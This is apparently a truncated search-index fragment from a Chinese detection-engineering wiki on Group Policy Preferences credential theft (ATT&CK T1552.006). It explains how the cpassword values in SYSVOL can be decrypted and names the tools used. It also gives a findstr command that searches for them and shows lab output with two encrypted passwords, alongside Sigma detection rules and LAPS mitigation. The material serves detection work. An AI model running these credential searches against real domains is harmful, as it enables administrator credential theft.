\u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u57fa\u4e8eGPP\u51ed\u8bc1\u83b7\u53d6findstr\u67e5\u627esysvol\u5185\u6f5c\u5728\u7684XML\u6587\u4ef6(\u53d1\u8d77\u653b\u51fb\u673a) description: windows server 2008 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c references: https://adsecurity.org/?p=2288 tags: T1552-006 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4688 # \u8fdb\u7a0b\u521b\u5efa NewProcessname: 'C:\\Windows\\System32\\findstr.exe' selection2: EventID: 5156 Direction: '\u51fa\u7ad9' #\u65b9\u5411\u4e3a\u51fa\u7ad9 DestinationPort: 445 #\u76ee\u6807\u7aef\u53e3\u4e3a445 selection3: EventID: 4689 #\u8fdb\u7a0b\u5173\u95ed Processname: 'C:\\Windows\\System32\\findstr.exe' timeframe: last 30s condition: all of them level: medium \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 title: \u57fa\u4e8eGPP\u51ed\u8bc1\u83b7\u53d6findstr\u67e5\u627esysvol\u5185\u6f5c\u5728\u7684XML\u6587\u4ef6(\u4e3b\u57df\u63a7\u670d\u52a1\u5668) description: windows server 2008 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c references: https://adsecurity.org/?p=2288 tags: T1552-006 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 5156 #Windows \u7b5b\u9009\u5e73\u53f0\u5df2\u5141\u8bb8\u8fde\u63a5\u3002 Direction: '\u5165\u7ad9' #\u65b9\u5411\u4e3a\u5165\u7ad9 SourcePort: 445 #\u6e90\u7aef\u53e3\u4e3a445 selection2: EventID: 4672 #\u4e3a\u65b0\u767b\u5f55\u5206\u914d\u4e86\u7279\u6b8a\u6743\u9650\u3002 selection3: EventID: 4624 #\u5df2\u6210\u529f\u767b\u5f55\u5e10\u6237\u3002 LogonType: 3 #\u767b\u9646\u7c7b\u578b\u4e3a3 LogonProcess: 'Kerberos' #\u767b\u9646\u8fdb\u7a0b\u4e3akerberos \u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f AuthenticationPackage: 'Kerberos' #\u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u5305Kerberos \u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f selection4: EventID: 5140 #\u5df2\u8bbf\u95ee\u7f51\u7edc\u5171\u4eab\u5bf9\u8c61\u3002 Objecttype: 'File' #\u7f51\u7edc\u4fe1\u606f>\u5bf9\u8c61\u7c7b\u578b ShareName: '\\\\*\\SYSVOL' #\u5171\u4eab\u4fe1\u606f>\u5171\u4eab\u540d:\\\\*\\SYSVOL Sharedpath: '\\??\\C:\\Windows\\SYSVOL\\sysvol' #\u5171\u4eab\u8def\u5f84 selection5: EventID: 5145 #\u5df2\u68c0\u67e5\u7f51\u7edc\u5171\u4eab\u5bf9\u8c61\u662f\u5426\u53ef\u4ee5\u6388\u4e88\u5ba2\u6237\u7aef\u6240\u9700\u7684\u8bbf\u95ee\u6743\u9650\u3002 Objecttype: 'File' #\u7f51\u7edc\u4fe1\u606f>\u5bf9\u8c61\u7c7b\u578b ShareName: '\\\\*\\SYSVOL' #\u5171\u4eab\u4fe1\u606f>\u5171\u4eab\u540d:\\\\*\\SYSVOL Shared path: '\\??\\C:\\Windows\\SYSVOL\\sysvol' #\u5171\u4eab\u8def\u5f84 timeframe: last 30s condition: all of them level: medium \u5efa\u8bae \u5173\u8054\u5206\u6790\u601d\u8def\uff1a\u5728\u4e3b\u57df\u63a7\u4e0a\u63d0\u53d6\u5230\u7684\u6e90IP\u5730\u5740\uff0c\u5c31\u662f\u7591\u4f3c\u53d1\u8d77\u653b\u51fb\u7684\u4e3b\u673a\u5730\u5740\u30025145\u30015140\u65e5\u5fd7\u4f1a\u8fdb\u884c\u8bb0\u5f55\u3002\u5728\u7591\u4f3c\u53d1\u8d77\u653b\u51fb\u7684\u4e3b\u673a\u4e0a\u67e5\u770b5156\u4e8b\u4ef6 \u6ce8\u610f\uff1a\u4e3b\u57df\u63a7\u670d\u52a1\u5668\u4e0a5156\u4e2d\u8bb0\u5f55\u7684\u76ee\u6807\u5730\u5740\u5373\u4e3a\u7591\u4f3c\u53d1\u8d77\u653b\u51fb\u7684\u4e3b\u673a\u5730\u5740\uff1b\u7591\u4f3c\u53d1\u8d77\u653b\u51fb\u7684\u4e3b\u673a\u4e2d5156\u8bb0\u5f55\u7684\u76ee\u6807\u5730\u5740\u5373\u662f\u4e3b\u57df\u63a7\u670d\u52a1\u5668\u3002\u53ef\u5728\u4e3b\u57df\u63a7\u4e0a\u8fdb\u884c\u68c0\u6d4b\u9891\u7e41\u53d1\u8d775156\u4e8b\u4ef6\u3002 \u7f13\u89e3\u63aa\u65bd \u901a\u8fc7\u7ec4\u7b56\u7565\u9996\u9009\u9879\u7f13\u89e3\u660e\u6587\u5bc6\u7801\u63d0\u53d6\u5a01\u80c1\u7684\u7b2c\u4e00\u6b65\u662f\u4e86\u89e3\u73af\u5883\u4e2d\u662f\u5426\u5b58\u5728\u8fd9\u79cd\u60c5\u51b5\u3002Microsoft\u5728\u5176 \u5b89\u5168\u516c\u544a\u4e2d \u63d0\u4f9b\u4e86\u6709\u5173\u6b64\u6f0f\u6d1e\u7684\u811a\u672c\uff0c\u53ef\u4ee5\u5229\u7528\u8be5\u811a\u672c\uff0c\u5e76\u4e14\u8fd8\u8bbe\u8ba1\u4e86\u8f6f\u4ef6\u89e3\u51b3\u65b9\u6848\u6765\u67e5\u627e\u53ef\u4ee5\u4f7f\u7528\u6b64\u65b9\u6cd5\u7a83\u53d6\u7684\u5bc6\u7801\u5b9e\u4f8b\u3002 \u4e00\u65e6\u786e\u5b9a\u4e86\u6f5c\u5728\u7684\u6f0f\u6d1e\uff0c\u5efa\u8bae\u627e\u5230\u5176\u4ed6\u65b9\u6cd5\u6765\u542f\u7528\u5148\u524d\u901a\u8fc7\u7ec4\u7b56\u7565\u9996\u9009\u9879\u8fdb\u884c\u7684\u4efb\u52a1\u6216\u8fc7\u7a0b\u3002\u4f8b\u5982\uff0cMicrosoft\u7684\u672c\u5730\u7ba1\u7406\u5458\u5bc6\u7801\u89e3\u51b3\u65b9\u6848\uff08LAPS\uff09\u662f\u4e00\u79cd\u6f5c\u5728\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u7528\u4e8e\u63d0\u4f9b\u5bf9\u7cfb\u7edf\u7684\u7ba1\u7406\u8bbf\u95ee\u6743\u9650\uff0c\u800c\u4e0d\u662f\u901a\u8fc7\u7ec4\u7b56\u7565\u9996\u9009\u9879\u63d0\u4f9b\u767b\u5f55\u811a\u672c\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1552-006 https://attack.mitre.org/techniques/T1552/006/ [\u7ffb\u8bd1 + \u5b9e\u8df5] \u51e0\u79cd\u83b7\u53d6\u57df\u7ba1\u7406\u5458\u6743\u9650\u7684\u65b9\u5f0f https://attacker.cc/index.php/archives/10/ \u57df\u5b89\u5168\u7bc7:\u5bfb\u627eSYSVOL\u91cc\u7684\u5bc6\u7801\u548c\u653b\u51fbGPP\uff08\u7ec4\u7b56\u7565\u504f\u597d\uff09 https://www.freebuf.com/vuls/92016.html \u5229\u7528\u57df\u51ed\u636e:\u89e3\u5bc6GPP\u4e2d\u7684\u7ba1\u7406\u5458\u5bc6\u7801 https://www.cnblogs.com/index-htm/p/5412496.html \u5728SYSVOL\u4e2d\u67e5\u627e\u5bc6\u7801\u5e76\u5229\u7528\u7ec4\u7b56\u7565\u9996\u9009\u9879 https://adsecurity.org/?p=2288","title":"T1552-006-windows-\u57fa\u4e8eGPP\u51ed\u8bc1\u83b7\u53d6"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#t1552-006-windows-gpp","text":"","title":"T1552-006-windows-\u57fa\u4e8eGPP\u51ed\u8bc1\u83b7\u53d6"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u5728\u7ec4\u7b56\u7565\u9996\u9009\u9879\uff08GPP\uff09\u4e2d\u67e5\u627e\u4e0d\u5b89\u5168\u7684\u51ed\u636e\u3002GPP\u662f\u5141\u8bb8\u7ba1\u7406\u5458\u4f7f\u7528\u5d4c\u5165\u5f0f\u51ed\u636e\u521b\u5efa\u57df\u7b56\u7565\u7684\u5de5\u5177\u3002\u8fd9\u4e9b\u7b56\u7565\u5141\u8bb8\u7ba1\u7406\u5458\u8bbe\u7f6e\u672c\u5730\u5e10\u6237\u3002 \u8fd9\u4e9b\u7ec4\u7b56\u7565\u5b58\u50a8\u5728\u57df\u63a7\u5236\u5668\u4e0a\u7684SYSVOL\u4e2d\u3002\u8fd9\u610f\u5473\u7740\u4efb\u4f55\u57df\u7528\u6237\u90fd\u53ef\u4ee5\u67e5\u770bSYSVOL\u5171\u4eab\u5e76\u89e3\u5bc6\u5bc6\u7801\uff08\u4f7f\u7528\u5df2\u516c\u5f00\u7684AES\u5bc6\u94a5\uff09\u3002 \u4ee5\u4e0b\u5de5\u5177\u548c\u811a\u672c\u53ef\u7528\u4e8e\u4ece\u7ec4\u7b56\u7565\u9996\u9009\u9879XML\u6587\u4ef6\u6536\u96c6\u548c\u89e3\u5bc6\u5bc6\u7801\u6587\u4ef6\uff1a Metasploit\u7684\u540e\u671f\u5f00\u53d1\u6a21\u5757: post/windows/gather/credentials/gpp Get-GPPPassword gpprefdecrypt.py \u5728SYSVOL\u5171\u4eab\u4e0a\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u6765\u679a\u4e3e\u6f5c\u5728\u7684GPP XML\u6587\u4ef6\uff1adir /s * .xml","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#gpp","text":"\u7ec4\u7b56\u7565\u9996\u9009\u9879\uff08GPP\uff09\u662f\u5141\u8bb8\u7ba1\u7406\u5458\u4f7f\u7528\u5d4c\u5165\u5f0f\u51ed\u636e\u521b\u5efa\u57df\u7b56\u7565\u7684\u5de5\u5177\u3002\u9664\u5176\u4ed6\u5916\uff0c\u8fd9\u4e9b\u7b56\u7565\u5141\u8bb8\u7ba1\u7406\u5458\u8bbe\u7f6e\u672c\u5730\u5e10\u6237\u3002 \u8fd9\u4e9b\u7ec4\u7b56\u7565\u5b58\u50a8\u5728\u57df\u63a7\u5236\u5668\u4e0a\u7684SYSVOL\u4e2d\uff0c\u8fd9\u610f\u5473\u7740\u4efb\u4f55\u57df\u7528\u6237\u90fd\u53ef\u4ee5\u67e5\u770bSYSVOL\u5171\u4eab\u5e76\u89e3\u5bc6\u5bc6\u7801 AES\u79c1\u94a5\u5df2\u5728\u7ebf\u6cc4\u9732 \u3002 SYSVOL \u662f\u5728\u57df\u4e2d\u5168\u57df\u5171\u4eab\u7684\uff0c\u6240\u6709\u8ba4\u8bc1\u57df\u7528\u6237\u90fd\u6709\u8bfb\u6743\u9650\u3002SYSVOL \u5305\u542b\u767b\u5f55\u811a\u672c\u3001\u7ec4\u7b56\u7565\u6570\u636e\uff0c\u4ee5\u53ca\u57df\u63a7\u9700\u8981\u8bbf\u95ee\u7684\u5176\u4ed6\u57df\u91cc\u9762\u7684\u6570\u636e\uff08SYSVOL \u4e2d\u7684\u6570\u636e\u81ea\u52a8\u88ab\u6240\u6709\u57df\u63a7\u6240\u5171\u4eab\uff09\u6240\u6709\u7684\u7ec4\u7b56\u7565\u90fd\u5b58\u50a8\u5728\u8fd9\u4e2a\u4f4d\u7f6e\uff1a \\\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\","title":"\u7ec4\u7b56\u7565\u9996\u9009\u9879\uff08GPP\uff09"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_1","text":"\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u4e0d\u9700\u8981\u4efb\u4f55\u9ed1\u5ba2\u5de5\u5177\uff0c\u653b\u51fb\u8005\u9700\u8981\u6253\u5f00\u6587\u4ef6\u6d4f\u89c8\u7684\u7a97\u53e3\u5e76\u4e14\u5728\u67e5\u627e\u57df\u6587\u4ef6\u5171\u4eab\u76ee\u5f55\u4e2d\u7684 XML \u6587\u4ef6\u3002\u901a\u5e38\u8fd9\u4e9b\u6587\u4ef6\u4f1a\u5305\u542b\u51ed\u636e\uff1aroups.xml\u3001scheduledtasks.xml\u3001Services.xml\u3002 \u4efb\u4f55\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237 (\u4efb\u4f55\u57df\u4e2d\u7528\u6237\u6216\u8005\u53d7\u4fe1\u4efb\u57df\u4e2d\u7684\u7528\u6237) \u90fd\u53ef\u4ee5\u67e5\u770b SYSVOL \u4e2d\u7684\u5305\u542b AES \u52a0\u5bc6\u5bc6\u7801\u7684 XML \u6587\u4ef6\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee\u6b64 XML \u6587\u4ef6\uff0c\u4f7f\u7528 AES \u79c1\u94a5\u6765\u89e3\u5bc6 GPP \u5bc6\u7801 \u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u5de5\u5177\u548c\u811a\u672c\u4ece\u7ec4\u7b56\u7565\u9996\u9009\u9879XML\u6587\u4ef6\u4e2d\u6536\u96c6\u548c\u89e3\u5bc6\u5bc6\u7801\u6587\u4ef6\uff1a Get-GPPPassword gpprefdecrypt.py ...... \u6ce8\u610f\uff1a\u5728SYSVOL\u5171\u4eab\u4e0a\uff0c\u4ee5\u4e0b\u547d\u4ee4\u53ef\u7528\u4e8e\u679a\u4e3e\u6f5c\u5728\u7684XML\u6587\u4ef6dir / s * .xml findstr /S /I cpassword \\\\0day.org\\sysvol\\0day.org\\policies\\*.xml \u5bf9\u4e8e\u901a\u8fc7\u7ec4\u7b56\u7565\u9996\u9009\u9879\u5b8c\u6210\u7684\u8bbe\u7f6e\uff0c\u6570\u636e\u5b58\u50a8\u5728SYSVOL\u6587\u4ef6\u5939\u4e2d\u7684XML\u6587\u4ef6\u4e2d\u3002\u5bf9\u4e8e\u67d0\u4e9b\u8bbe\u7f6e\uff0c\u9700\u8981\u7528\u6237\u51ed\u636e\uff0c\u4f8b\u5982\uff1a \u6620\u5c04\u9a71\u52a8\u5668\uff08Drives.xml\uff09 \u521b\u5efa\u672c\u5730\u7528\u6237\uff08unattend.xml\uff09 \u6570\u636e\u6e90\uff08DataSources.xml\uff09 \u6253\u5370\u673a\u914d\u7f6e\uff08Printers.xml\uff09 \u521b\u5efa/\u66f4\u65b0\u670d\u52a1\uff08Services.xml\uff09 \u8ba1\u5212\u4efb\u52a1\uff08ScheduledTasks.xml\uff09 \u66f4\u6539\u672c\u5730\u7ba1\u7406\u5458\u5bc6\u7801 \u7ec4\u7b56\u7565\u9996\u9009\u9879\uff08Groups.xml\uff09 \u53ef\u4ee5\u4f7f\u7528\u5173\u952e\u5b57\u641c\u7d22\u5728SYSVOL\u6587\u4ef6\u5939\u4e2d\u641c\u7d22\u8fd9\u4e9bXML\u6587\u4ef6\u3002\u53ef\u4ee5\u4f7f\u7528\u952e\u503c\u201c cpassword \u201d \u641c\u7d22XML\u6587\u4ef6\u4e2d\u7684\u5bc6\u7801\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_3","text":"\u7ec4\u7b56\u7565\u9996\u9009\u9879\u5141\u8bb8\u7ba1\u7406\u5458\u5728Active Directory\u57df\u4e2d\u7684\u670d\u52a1\u5668\u548c\u5de5\u4f5c\u7ad9\u4e0a\u521b\u5efa\u548c\u7ba1\u7406\u672c\u5730\u5e10\u6237\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u8f7b\u677e\u627e\u5230\u5e76\u83b7\u53d6\u7531\u7ec4\u7b56\u7565\u9996\u9009\u9879\u7ba1\u7406\u7684\u7ba1\u7406\u5e10\u6237\u51ed\u636e\u7684\u52a0\u5bc6\u5bc6\u7801\uff0c\u7136\u540e\u4f7f\u7528Microsoft\u53d1\u5e03\u7684AES\u5bc6\u94a5\u5bf9\u5176\u8fdb\u884c\u89e3\u5bc6\u3002 \u4ee5\u4e0b\u662f\u653b\u51fb\u7684\u5de5\u4f5c\u65b9\u5f0f\u7684\u6458\u8981\uff1a \u653b\u51fb\u8005\u5229\u7528PowerShell\u6216PowerSploit\u7684Get-GPPPassword\u547d\u4ee4\u7b49\u5176\u4ed6\u5de5\u5177\uff0c\u5728\u57df\u63a7\u5236\u5668\u7684SYSVOL\u5171\u4eab\u4e0a\u627e\u5230\u5305\u542bAES\u52a0\u5bc6\u7684\u672c\u5730\u5e10\u6237\u5bc6\u7801\u7684\u7ec4\u7b56\u7565XML\u6587\u4ef6\u3002 \u653b\u51fb\u8005\u7ed3\u5408Microsoft\u53d1\u5e03\u7684AES\u5bc6\u94a5\uff0c\u5bf9\u5bc6\u7801\u8fdb\u884c\u89e3\u5bc6\uff0c\u4ee5\u660e\u6587\u5f62\u5f0f\u663e\u793a\u7ba1\u7406\u5e10\u6237\u5bc6\u7801\u3002 \u7531\u4e8eSYSVOL\u5171\u4eab\u5bf9\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u5f00\u653e\uff0c\u56e0\u6b64\u7ec4\u7ec7\u5185\u7684\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u8bfb\u53d6\u6b64\u5904\u5b58\u50a8\u7684\u6587\u4ef6\u3002\u56e0\u6b64\uff0c\u4efb\u4f55\u7528\u6237\u5e10\u6237\u90fd\u53ef\u4ee5\u67e5\u627e\u548c\u89e3\u5bc6\u8fd9\u4e9b\u6587\u4ef6\uff0c\u5e76\u53ef\u4ee5\u8bbf\u95ee\u7ba1\u7406\u5458\u5e10\u6237\u7684\u7eaf\u6587\u672c\u5bc6\u7801\u3002 Microsoft Windows [\u7248\u672c 6.1.7601] \u7248\u6743\u6240\u6709 (c) 2009 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Windows\\system32>findstr /S /I cpassword \\\\0day.org\\sysvol\\0day.org\\policies\\ *.xml \\\\0day.org\\sysvol\\0day.org\\policies\\{0EA52652-3A0D-4135-8BD7-92EFF59CB765}\\Machi ne\\Preferences\\Groups\\Groups.xml:<Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D 24D26}\"><User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"tester\" image =\"0\" changed=\"2019-05-20 06:34:56\" uid=\"{47664872-E0C4-4476-A963-9F34564042B1}\"> <Properties action=\"C\" fullName=\"\" description=\"\" cpassword=\"WzC8r0KH+edYsh0heQv AVwcNxtSvX1efu9MU+z5e37E\" changeLogon=\"0\" noChange=\"0\" neverExpires=\"1\" acctDisa bled=\"0\" userName=\"tester\"/></User> \\\\0day.org\\sysvol\\0day.org\\policies\\{0EA52652-3A0D-4135-8BD7-92EFF59CB765}\\Machi ne\\Preferences\\Groups\\Groups.xml: <User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9 BDE98BA1D1}\" name=\"klionsec\" image=\"0\" changed=\"2019-05-20 06:35:29\" uid=\"{FBA27 650-BF8A-4EA4-A308-91540384B7E2}\"><Properties action=\"C\" fullName=\"\" description =\"\" cpassword=\"tlKQrm9IwkVCQX65tWY+KZ1iBu7tbjQ/2vCOFU3Kkiw\" changeLogon=\"0\" noCh ange=\"0\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"klionsec\"/></User>","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#sigma","text":"title: \u57fa\u4e8eGPP\u51ed\u8bc1\u83b7\u53d6findstr\u67e5\u627esysvol\u5185\u6f5c\u5728\u7684XML\u6587\u4ef6(\u53d1\u8d77\u653b\u51fb\u673a) description: windows server 2008 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c references: https://adsecurity.org/?p=2288 tags: T1552-006 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4688 # \u8fdb\u7a0b\u521b\u5efa NewProcessname: 'C:\\Windows\\System32\\findstr.exe' selection2: EventID: 5156 Direction: '\u51fa\u7ad9' #\u65b9\u5411\u4e3a\u51fa\u7ad9 DestinationPort: 445 #\u76ee\u6807\u7aef\u53e3\u4e3a445 selection3: EventID: 4689 #\u8fdb\u7a0b\u5173\u95ed Processname: 'C:\\Windows\\System32\\findstr.exe' timeframe: last 30s condition: all of them level: medium \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 title: \u57fa\u4e8eGPP\u51ed\u8bc1\u83b7\u53d6findstr\u67e5\u627esysvol\u5185\u6f5c\u5728\u7684XML\u6587\u4ef6(\u4e3b\u57df\u63a7\u670d\u52a1\u5668) description: windows server 2008 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c references: https://adsecurity.org/?p=2288 tags: T1552-006 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 5156 #Windows \u7b5b\u9009\u5e73\u53f0\u5df2\u5141\u8bb8\u8fde\u63a5\u3002 Direction: '\u5165\u7ad9' #\u65b9\u5411\u4e3a\u5165\u7ad9 SourcePort: 445 #\u6e90\u7aef\u53e3\u4e3a445 selection2: EventID: 4672 #\u4e3a\u65b0\u767b\u5f55\u5206\u914d\u4e86\u7279\u6b8a\u6743\u9650\u3002 selection3: EventID: 4624 #\u5df2\u6210\u529f\u767b\u5f55\u5e10\u6237\u3002 LogonType: 3 #\u767b\u9646\u7c7b\u578b\u4e3a3 LogonProcess: 'Kerberos' #\u767b\u9646\u8fdb\u7a0b\u4e3akerberos \u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f AuthenticationPackage: 'Kerberos' #\u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u5305Kerberos \u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f selection4: EventID: 5140 #\u5df2\u8bbf\u95ee\u7f51\u7edc\u5171\u4eab\u5bf9\u8c61\u3002 Objecttype: 'File' #\u7f51\u7edc\u4fe1\u606f>\u5bf9\u8c61\u7c7b\u578b ShareName: '\\\\*\\SYSVOL' #\u5171\u4eab\u4fe1\u606f>\u5171\u4eab\u540d:\\\\*\\SYSVOL Sharedpath: '\\??\\C:\\Windows\\SYSVOL\\sysvol' #\u5171\u4eab\u8def\u5f84 selection5: EventID: 5145 #\u5df2\u68c0\u67e5\u7f51\u7edc\u5171\u4eab\u5bf9\u8c61\u662f\u5426\u53ef\u4ee5\u6388\u4e88\u5ba2\u6237\u7aef\u6240\u9700\u7684\u8bbf\u95ee\u6743\u9650\u3002 Objecttype: 'File' #\u7f51\u7edc\u4fe1\u606f>\u5bf9\u8c61\u7c7b\u578b ShareName: '\\\\*\\SYSVOL' #\u5171\u4eab\u4fe1\u606f>\u5171\u4eab\u540d:\\\\*\\SYSVOL Shared path: '\\??\\C:\\Windows\\SYSVOL\\sysvol' #\u5171\u4eab\u8def\u5f84 timeframe: last 30s condition: all of them level: medium","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_6","text":"\u5173\u8054\u5206\u6790\u601d\u8def\uff1a\u5728\u4e3b\u57df\u63a7\u4e0a\u63d0\u53d6\u5230\u7684\u6e90IP\u5730\u5740\uff0c\u5c31\u662f\u7591\u4f3c\u53d1\u8d77\u653b\u51fb\u7684\u4e3b\u673a\u5730\u5740\u30025145\u30015140\u65e5\u5fd7\u4f1a\u8fdb\u884c\u8bb0\u5f55\u3002\u5728\u7591\u4f3c\u53d1\u8d77\u653b\u51fb\u7684\u4e3b\u673a\u4e0a\u67e5\u770b5156\u4e8b\u4ef6 \u6ce8\u610f\uff1a\u4e3b\u57df\u63a7\u670d\u52a1\u5668\u4e0a5156\u4e2d\u8bb0\u5f55\u7684\u76ee\u6807\u5730\u5740\u5373\u4e3a\u7591\u4f3c\u53d1\u8d77\u653b\u51fb\u7684\u4e3b\u673a\u5730\u5740\uff1b\u7591\u4f3c\u53d1\u8d77\u653b\u51fb\u7684\u4e3b\u673a\u4e2d5156\u8bb0\u5f55\u7684\u76ee\u6807\u5730\u5740\u5373\u662f\u4e3b\u57df\u63a7\u670d\u52a1\u5668\u3002\u53ef\u5728\u4e3b\u57df\u63a7\u4e0a\u8fdb\u884c\u68c0\u6d4b\u9891\u7e41\u53d1\u8d775156\u4e8b\u4ef6\u3002","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_7","text":"\u901a\u8fc7\u7ec4\u7b56\u7565\u9996\u9009\u9879\u7f13\u89e3\u660e\u6587\u5bc6\u7801\u63d0\u53d6\u5a01\u80c1\u7684\u7b2c\u4e00\u6b65\u662f\u4e86\u89e3\u73af\u5883\u4e2d\u662f\u5426\u5b58\u5728\u8fd9\u79cd\u60c5\u51b5\u3002Microsoft\u5728\u5176 \u5b89\u5168\u516c\u544a\u4e2d \u63d0\u4f9b\u4e86\u6709\u5173\u6b64\u6f0f\u6d1e\u7684\u811a\u672c\uff0c\u53ef\u4ee5\u5229\u7528\u8be5\u811a\u672c\uff0c\u5e76\u4e14\u8fd8\u8bbe\u8ba1\u4e86\u8f6f\u4ef6\u89e3\u51b3\u65b9\u6848\u6765\u67e5\u627e\u53ef\u4ee5\u4f7f\u7528\u6b64\u65b9\u6cd5\u7a83\u53d6\u7684\u5bc6\u7801\u5b9e\u4f8b\u3002 \u4e00\u65e6\u786e\u5b9a\u4e86\u6f5c\u5728\u7684\u6f0f\u6d1e\uff0c\u5efa\u8bae\u627e\u5230\u5176\u4ed6\u65b9\u6cd5\u6765\u542f\u7528\u5148\u524d\u901a\u8fc7\u7ec4\u7b56\u7565\u9996\u9009\u9879\u8fdb\u884c\u7684\u4efb\u52a1\u6216\u8fc7\u7a0b\u3002\u4f8b\u5982\uff0cMicrosoft\u7684\u672c\u5730\u7ba1\u7406\u5458\u5bc6\u7801\u89e3\u51b3\u65b9\u6848\uff08LAPS\uff09\u662f\u4e00\u79cd\u6f5c\u5728\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u7528\u4e8e\u63d0\u4f9b\u5bf9\u7cfb\u7edf\u7684\u7ba1\u7406\u8bbf\u95ee\u6743\u9650\uff0c\u800c\u4e0d\u662f\u901a\u8fc7\u7ec4\u7b56\u7565\u9996\u9009\u9879\u63d0\u4f9b\u767b\u5f55\u811a\u672c\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%